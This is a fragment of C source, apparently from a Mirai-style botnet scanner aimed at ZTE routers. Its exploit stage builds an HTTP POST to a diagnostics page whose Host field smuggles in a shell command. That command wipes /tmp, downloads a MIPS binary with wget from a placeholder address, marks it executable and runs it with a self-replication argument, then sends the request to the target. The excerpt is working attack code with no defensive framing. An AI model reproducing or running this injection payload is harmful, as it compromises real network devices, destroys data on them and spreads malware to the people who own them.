            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    if(conn->state == ztescanner_SC_EXPLOIT_STAGE2)
                    {
						...
						sleep(1);
						// Command Injection
						util_strcpy(conn->payload_buf, "POST /manager_dev_ping_t.gch HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\r\nContent-Length: 420\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n&Host=;$(cd /tmp; rm -rf *; wget http://0.0.0.0/5r3fqt67ew531has4231.mips; chmod 777 5r3fqt67ew531has4231.mips; ./5r3fqt67ew531has4231.mips selfrep.zte)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit");
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
						sleep(1);
						// Logout Request
